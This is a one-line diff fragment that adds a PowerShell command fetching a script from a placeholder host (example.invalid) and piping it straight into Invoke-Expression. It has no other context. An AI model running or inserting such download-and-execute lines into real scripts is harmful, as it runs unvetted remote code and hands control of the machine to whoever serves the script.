@@ -1,0 +1,1 @@
+irm https://example.invalid/x.ps1 | iex
